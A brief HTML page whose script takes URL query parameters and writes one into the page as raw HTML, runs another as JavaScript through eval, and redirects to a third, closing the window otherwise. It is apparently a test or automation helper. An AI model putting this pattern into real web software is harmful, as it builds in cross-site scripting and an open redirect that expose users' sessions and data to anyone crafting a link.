<!DOCTYPE html>
<html>
<body>
<script>
  try {
    const sp = new URLSearchParams(window.location.search)

    const sx = sp.get('s')
    
    const hx = sp.get('h')
    const cx = sp.get('x')
    const lx = sp.get('l')

    if (hx) (document.open(), document.write(decodeURIComponent(hx)), document.close())
    if (cx) eval(decodeURIComponent(cx))
    if (lx) window.location = decodeURIComponent(lx)

    if (sx == undefined) throw null
  } 
  catch { let _ = window.open('', '_self'); window.close(), _.close() }
</script>
</body>
</html>
